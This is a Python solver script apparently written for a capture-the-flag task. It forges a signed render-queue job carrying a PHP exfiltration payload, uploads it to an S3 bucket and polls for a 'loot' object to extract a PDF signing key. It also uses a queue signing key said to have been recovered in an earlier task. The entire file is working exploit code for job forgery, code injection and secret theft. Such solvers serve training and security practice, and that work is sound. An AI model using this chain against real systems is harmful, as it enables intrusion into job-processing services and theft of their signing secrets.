#!/usr/bin/env python3
"""Task21 one-shot solver: forge, upload, poll worker loot, extract PDF signing key."""

from __future__ import annotations

import argparse
import json
import os
import re
import time
from pathlib import Path

import exploit2
import s3
import s3put

DEFAULT_BUCKET = "medhunter-resumes-6d6c314a"
TASK_DIR = Path(__file__).resolve().parent
FLAG_RE = re.compile(rb"(?:PDF_SIGNING_KEY\s*=\s*)?(avito\{[^}\r\n]+\})")


def solve(
    queue_key: str,
    bucket: str,
    *,
    timeout: float,
    keep_job: Path | None,
    pairs_file: Path | None,
) -> str:
    """Forge and deliver a render job, then poll its attacker-readable loot object."""
    php, loot_key = exploit2.build_exfil_php(bucket)
    job = exploit2.forge_job(queue_key, php)
    body = json.dumps(job, separators=(",", ":")).encode()
    incoming = f"incoming/{job['key']}.json"
    if keep_job:
        keep_job.write_bytes(body)
        print(f"[forge] local copy: {keep_job}")
    status, response = s3put.req("PUT", bucket, incoming, body, "application/json")
    print(f"[upload] s3://{bucket}/{incoming} -> HTTP {status}")
    if status // 100 != 2:
        raise RuntimeError(response.decode("utf-8", "replace")[:1000])

    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        status, loot = s3.req("GET", bucket, loot_key)
        if status == 200:
            print(f"[loot] s3://{bucket}/{loot_key} ({len(loot)} bytes)")
            match = FLAG_RE.search(loot)
            if not match:
                raise RuntimeError("worker loot arrived but PDF_SIGNING_KEY/flag was absent")
            secret = match.group(1).decode()
            print(f"FLAG / PDF_SIGNING_KEY: {secret}")
            if pairs_file:
                if not exploit2.verify_secret(secret, pairs_file):
                    raise RuntimeError("recovered key does not match the saved verification pairs")
                print(f"[verify] key matches every pair in {pairs_file}")
            return secret
        if status not in {403, 404}:
            print(f"[poll] HTTP {status}: {loot[:300]!r}")
        time.sleep(2)
    raise TimeoutError(f"loot {loot_key} did not appear within {timeout:.0f}s")


def main() -> None:
    """CLI entry point."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--mhq-key",
        default=os.environ.get("RENDER_QUEUE_SIGNING_KEY"),
        help="mhq_v1_... recovered by task19 (or $RENDER_QUEUE_SIGNING_KEY)",
    )
    parser.add_argument("--bucket", default=DEFAULT_BUCKET)
    parser.add_argument("--timeout", type=float, default=120)
    parser.add_argument("--keep-job", type=Path)
    parser.add_argument("--pairs-file", type=Path, default=TASK_DIR / "pairs_sorted.txt")
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()
    if args.self_test:
        key = "mhq_v1_0123456789abcdef0123456789abcdef"
        php, loot = exploit2.build_exfil_php(DEFAULT_BUCKET)
        job = exploit2.forge_job(key, php)
        assert loot.startswith("loot/dump-")
        assert php.count("{") == php.count("}")
        assert len(job["signature"]) == 64
        assert exploit2.verification_code("secret", "id") == (
            "0da5b4052abdeb0bbd119978c49479893059d51a19522a70e4672259a6d720b5"
        )
        print("self-test: OK")
        return
    if not args.mhq_key:
        parser.error("--mhq-key or $RENDER_QUEUE_SIGNING_KEY is required")
    solve(
        args.mhq_key,
        args.bucket,
        timeout=args.timeout,
        keep_job=args.keep_job,
        pairs_file=args.pairs_file,
    )


if __name__ == "__main__":
    main()
